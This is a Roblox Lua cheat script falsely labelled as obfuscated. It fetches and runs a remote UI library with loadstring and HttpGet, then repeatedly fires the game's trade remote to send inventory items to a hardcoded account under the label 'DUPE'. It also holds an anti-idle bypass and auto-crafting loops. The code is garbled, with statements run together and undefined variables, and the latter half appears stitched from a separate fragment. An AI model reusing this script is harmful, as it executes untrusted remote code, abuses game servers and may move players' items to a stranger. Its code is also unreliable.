--([[This file was protected with MoonSec V3 by Federal#9999]])
local p2 = game:GetService("ReplicatedStorage").Remotes local lib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))() local a = lib:CreateWindow("Duping") local f4 = "Add" local q = "?" local p3 = p2.TradeItemRequester local FirstAccountName = "Deeraloo1" local ff = "1." local DUPE = f4 local q2= q..q local b = a:CreateFolder("2nd Player") b:Toggle("Enabled",function(bool) end)  p1 = game:GetService("Players").LocalPlayer.PlayerGui.inventory.mainFrame1234.a1.a2.scrollingFrame:GetChildren() local q3 = q..q..q local ff3 = "1m" while wait(3) do for i,v in p1 do if v.ClassName == "Frame" then if v.dmg.Text == q..q or v.dmg.Text == q..q..q then DUPEDITEM = v.Name p3:FireServer(FirstAccountName, DUPEDITEM, DUPE) end end end end local vu = game:GetService("VirtualUser")game:GetService("Players").LocalPlayer.Idled:connect(function()  vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame) wait(1)  vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)end) -- local emeraldPets = {}for i,v in pairs(game:GetService("ReplicatedStorage").Emerald:GetChildren()) do if v:IsA("Model") and not table.find(emeraldPets, v.Name) then table.insert(emeraldPets, v.Name) endendtable.sort(emeraldPets)local selectedEmeraldPetm:Dropdown("Emerald Pets",emeraldPets,true,function(mob) selectedEmeraldPet = mobend)m:Toggle("Auto Dark-Matter",function(bool) getgenv().DarkMatter = bool print("Auto Dark-Matter is: ", bool) doDarkMatter(selectedEmeraldPet)end)local diamondPets = {}for i,v in pairs(game:GetService("ReplicatedStorage").Diamond:GetChildren()) do if v:IsA("Model") and not table.find(diamondPets, v.Name) then table.insert(diamondPets, v.Name) endendtable.sort(diamondPets)local selectedDiamondPetl:Dropdown("Diamond Pets",diamondPets,true,function(mob) selectedDiamondPet = mobend)l:Toggle("Auto Emerald",function(bool) getgenv().Emerald = bool print("Auto Emerald is: ", bool) doEmerald(selectedDiamondPet)end)local goldenPets = {}for i,v in pairs(game:GetService("ReplicatedStorage").Golden:GetChildren()) doif v:IsA("Model") and not table.find(goldenPets, v.Name) then table.insert(goldenPets, v.Name) endendtable.sort(goldenPets)local selectedGoldenPetk:Dropdown("Golden Pets",goldenPets,true,function(mob) selectedGoldenPet = mobend)k:Toggle("Auto Diamond",function(bool) getgenv().Diamond = bool print("Auto Diamond is: ", bool) doDiamond(selectedGoldenPet)end)local Pets = {}for i,v in pairs(game:GetService("ReplicatedStorage").PetModels:GetChildren()) do if v:IsA("Model") and not table.find(Pets, v.Name) then table.insert(Pets, v.Name) endendtable.sort(Pets)local selectedPetj:Dropdown("Pets",Pets,true,function(mob) --true/false, replaces the current title "Dropdown" with the option that t selectedPet = mobend)j:Toggle("Auto Golden",function(bool) getgenv().Golden = bool print("Auto Golden is: ", bool) if bool and selectedPet then doGolden(selectedPet) endend)function doGolden(petType) spawn(function() while getgenv().Golden == true do remotePath.CraftToGold:FireServer(petType) wait(1) end end)endfunction doDiamond(petType) spawn(function() while getgenv().Diamond == true do remotePath.CraftToGold:FireServer(petType,"Golden") wait(1) end end)endfunction doEmerald(petType) spawn(function() while getgenv().Emerald == true do remotePath.CraftToGold:FireServer(petType, "Diamond") wait(1) end end)endfunction doDarkMatter(petType) spawn(function() while getgenv().DarkMatter == true do remotePath.CraftToGold:FireServer(petType, "Emerald") wait(1) end end)end
